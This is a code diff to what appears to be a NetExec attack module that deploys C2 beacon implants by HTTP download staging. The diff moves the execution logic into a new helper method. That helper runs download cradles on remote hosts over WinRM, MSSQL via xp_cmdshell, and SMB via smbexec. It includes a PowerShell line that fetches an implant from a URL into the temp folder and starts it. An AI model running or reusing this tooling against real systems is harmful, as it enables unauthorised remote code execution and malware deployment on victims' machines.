@@ -1369,6 +1369,83 @@ class NXCModule:
         
         return cmd
 
+    def _execute_staged_command(self, context, connection, protocol, cmd, os_type, handler, download_url=None, implant_name=None):
+        """
+        Execute the download cradle command via the appropriate protocol.
+        
+        Args:
+            context: NetExec context
+            connection: NetExec connection
+            protocol: Protocol name (winrm, mssql, smb, ssh)
+            cmd: Command to execute
+            os_type: Target OS type
+            handler: ProtocolHandler instance
+            download_url: Original download URL (for WinRM PowerShell)
+            implant_name: Implant filename (for WinRM PowerShell)
+        """
+        host = connection.host
+        
+        if protocol == "winrm":
+            # For WinRM, use ps_execute if it's a PowerShell command
+            if self.staging_method == "powershell":
+                # Execute the PowerShell portion directly
+                inner_ps = f"IWR '{download_url}' -OutFile $env:TEMP\\{implant_name}; Start-Process $env:TEMP\\{implant_name}"
+                result = connection.ps_execute(inner_ps, get_output=True)
+                if result and result.strip():
+                    context.log.debug(f"PowerShell output: {result}")
+            else:
+                # For certutil/bitsadmin, use regular execute
+                connection.execute(cmd)
+        elif protocol == "mssql":
+            # MSSQL: Execute download cradle via xp_cmdshell
+            
+            # Reject Linux download tools (MSSQL targets Windows only)
+            if self.staging_method in ["wget", "curl", "python"]:
+                context.log.fail(f"Download tool '{self.staging_method}' not supported for MSSQL (Windows-only protocol)")
+                sys.exit(1)
+            
+            # Increase socket timeout for download operation (17MB implant can take 30+ seconds)
+            # NetExec's execute() handles xp_cmdshell enable/disable automatically via MSSQLEXEC
+            original_timeout = None
+            try:
+                if hasattr(connection.conn, 'socket') and connection.conn.socket:
+                    original_timeout = connection.conn.socket.gettimeout()
+                    connection.conn.socket.settimeout(120)  # 2 minutes for download
+                    context.log.debug("Increased socket timeout to 120s for download operation")
+                
+                connection.execute(cmd)
+                context.log.info("Download cradle executed via MSSQL (xp_cmdshell)")
+            finally:
+                # Restore original timeout
+                if original_timeout is not None and hasattr(connection.conn, 'socket') and connection.conn.socket:
+                    try:
+                        connection.conn.socket.settimeout(original_timeout)
+                    except (AttributeError, OSError):
+                        pass  # Ignore errors restoring timeout
+        elif protocol == "smb":
+            # SMB: Execute download cradle via smbexec
+            
+            # Reject Linux download tools (SMB staging is Windows-only)
+            if self.staging_method in ["wget", "curl", "python"]:
+                context.log.fail(f"Download tool '{self.staging_method}' not supported for SMB staging (Windows-only)")
+                context.log.fail("Use STAGING=direct for Linux/Samba targets, or use powershell/certutil/bitsadmin")
+                sys.exit(1)
+            
+            # Check if target is Linux/Samba - staging not supported
+            if os_type != "windows":
+                context.log.fail("SMB HTTP staging only supported for Windows targets")
+                context.log.fail("Use STAGING=direct for Linux/Samba targets")
+                sys.exit(1)
+            
+            # Execute via smbexec
+            connection.execute(cmd, methods=["smbexec"])
+            context.log.info("Download cradle executed via SMB (smbexec)")
+        else:
+            # For other protocols, use handler's execute method
+            handler.execute(context, connection, cmd, os_type)
+        
+        context.log.info(f"Download cradle executed on {host}")
+
     def _run_beacon_staged_http(self, context, connection, os_type, arch, implant_name, handler):
         """
         Execute beacon via HTTP download staging.
@@ -1451,75 +1528,7 @@ class NXCModule:
         
         # 5. Execute on target
         context.log.display(f"Executing download cradle on {host} via {protocol}...")
-        
-        if protocol == "winrm":
-            # For WinRM, use ps_execute if it's a PowerShell command
-            if self.staging_method == "powershell":
-                # Execute the PowerShell portion directly
-                inner_ps = f"IWR '{download_url}' -OutFile $env:TEMP\\{implant_name}; Start-Process $env:TEMP\\{implant_name}"
-                result = connection.ps_execute(inner_ps, get_output=True)
-                if result and result.strip():
-                    context.log.debug(f"PowerShell output: {result}")
-            else:
-                # For certutil/bitsadmin, use regular execute
-                connection.execute(cmd)
-        elif protocol == "mssql":
-            # MSSQL: Execute download cradle via xp_cmdshell
-            
-            # Reject Linux download tools (MSSQL targets Windows only)
-            if self.staging_method in ["wget", "curl", "python"]:
-                context.log.fail(f"Download tool '{self.staging_method}' not supported for MSSQL (Windows-only protocol)")
-                sys.exit(1)
-            
-            # Increase socket timeout for download operation (17MB implant can take 30+ seconds)
-            # NetExec's execute() handles xp_cmdshell enable/disable automatically via MSSQLEXEC
-            original_timeout = None
-            try:
-                if hasattr(connection.conn, 'socket') and connection.conn.socket:
-                    original_timeout = connection.conn.socket.gettimeout()
-                    connection.conn.socket.settimeout(120)  # 2 minutes for download
-                    context.log.debug("Increased socket timeout to 120s for download operation")
-                
-                connection.execute(cmd)
-                context.log.info("Download cradle executed via MSSQL (xp_cmdshell)")
-            finally:
-                # Restore original timeout
-                if original_timeout is not None and hasattr(connection.conn, 'socket') and connection.conn.socket:
-                    try:
-                        connection.conn.socket.settimeout(original_timeout)
-                    except (AttributeError, OSError):
-                        pass  # Ignore errors restoring timeout
-        elif protocol == "smb":
-            # SMB: Execute download cradle via smbexec
-            
-            # Reject Linux download tools (SMB staging is Windows-only)
-            if self.staging_method in ["wget", "curl", "python"]:
-                context.log.fail(f"Download tool '{self.staging_method}' not supported for SMB staging (Windows-only)")
-                context.log.fail("Use STAGING=direct for Linux/Samba targets, or use powershell/certutil/bitsadmin")
-                sys.exit(1)
-            
-            # Check if target is Linux/Samba - staging not supported
-            if os_type != "windows":
-                context.log.fail("SMB HTTP staging only supported for Windows targets")
-                context.log.fail("Use STAGING=direct for Linux/Samba targets")
-                sys.exit(1)
-            
-            # Build command based on download tool
-            try:
-                cmd = self._build_download_cradle(os_type, download_url, implant_name, protocol="smb")
-                context.log.debug(f"Using {self.staging_method} staging method via SMB")
-            except ValueError as e:
-                context.log.fail(str(e))
-                sys.exit(1)
-            
-            # Execute via smbexec
-            connection.execute(cmd, methods=["smbexec"])
-            context.log.info("Download cradle executed via SMB (smbexec)")
-        else:
-            # For other protocols, use handler's execute method
-            handler.execute(context, connection, cmd, os_type)
-        
-        context.log.info(f"Download cradle executed on {host}")
+        self._execute_staged_command(context, connection, protocol, cmd, os_type, handler, download_url, implant_name)
         
         # Return cleanup info (will be handled by caller)
         return None, listener_job_id, website_name
